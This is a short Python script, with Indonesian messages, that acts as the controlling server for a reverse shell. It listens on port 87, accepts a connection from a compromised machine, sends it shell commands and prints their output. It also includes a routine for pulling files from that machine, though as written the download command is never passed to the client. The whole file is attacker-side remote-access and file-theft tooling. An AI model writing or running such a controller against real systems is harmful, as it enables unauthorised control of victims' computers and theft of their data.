import socket
import json
import os

HOST = '0.0.0.0'
PORT = 87

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)
print(f"[+] Menunggu koneksi di {HOST}:{PORT}")

client_socket, addr = server.accept()
print(f"[+] Terhubung dengan {addr}")

def reliable_send(data):
    json_data = json.dumps(data)
    client_socket.sendall(json_data.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            part = client_socket.recv(1024).decode()
            data += part
            return json.loads(data)
        except ValueError:
            continue

def download(filename):
    with open(filename, 'wb') as f:
        size = reliable_recv()["size"]
        received = 0
        while received < size:
            data = client_socket.recv(1024)
            if not data:
                break
            f.write(data)
            received += len(data)
    print(f"[+] File {filename} berhasil di-download.")

def command_shell():
    while True:
        command = input(">> ")
        if command == "quit":
            reliable_send("quit")
            break
        elif command.startswith("download "):
            download(command.split(" ")[1])
        else:
            reliable_send(command)
            result = reliable_recv()
            print(result)

command_shell()
client_socket.close()
server.close()
